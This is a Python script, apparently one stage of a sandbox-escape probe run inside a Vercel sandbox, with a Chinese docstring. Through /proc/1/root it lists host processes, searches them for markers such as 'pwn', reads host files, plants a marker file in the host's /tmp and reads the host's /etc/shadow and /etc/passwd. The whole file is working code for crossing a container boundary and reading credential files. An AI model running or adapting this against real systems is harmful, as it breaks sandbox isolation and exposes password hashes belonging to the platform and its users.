# -*- coding: utf-8 -*-
"""v189 阶段B: guest - 宿主 ps 找 sleep 进程 + 宿主特征文件检查 + 创建 v189rm.txt 供用户 Remove 测试"""
import socket, time, json, os, signal

OUT = '/vercel/sandbox/v189c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


log('=== 1 host ps ===')
r = os.popen('ps -ef 2>&1').read()
log('HPS (%d): %s' % (len(r), r[:4000]))
for kw in ['sleep', '600', 'sh -c', 'out189', 'pwn']:
    for line in r.splitlines():
        if kw in line:
            log('HPS HIT %s: %s' % (kw, line))

log('=== 2 host files ===')
checks = ['/proc/1/root/tmp/out189.txt', '/proc/1/root/vercel/sandbox/out189.txt',
          '/proc/1/root/tmp/v189rm.txt', '/proc/1/root/tmp/out188.txt',
          '/mnt/g/mnt/h/tmp/out189.txt', '/mnt/g/mnt/h/tmp/out188.txt',
          '/mnt/g/tmp/out189.txt', '/mnt/g/vercel/sandbox/out189.txt']
for p in checks:
    try:
        d = open(p, 'rb').read()
        log('H %s (%d): %r' % (p, len(d), d[:1200]))
    except Exception as e:
        log('H %s EXC %s' % (p, e))

log('=== 3 create host marker for user Remove test ===')
try:
    open('/proc/1/root/tmp/v189rm.txt', 'w').write('RM189MARK')
    d = open('/proc/1/root/tmp/v189rm.txt', 'rb').read()
    log('CREATED v189rm.txt: %r' % d)
except Exception as e:
    log('CREATE EXC %s' % e)

log('=== 4 integrity ===')
for p in ['/proc/1/root/etc/shadow', '/proc/1/root/etc/passwd']:
    try:
        d = open(p, 'rb').read()
        log('I %s (%d) %r' % (p, len(d), d[:60]))
    except Exception as e:
        log('I %s EXC %s' % (p, e))

log('V189_DONE')
f.close()
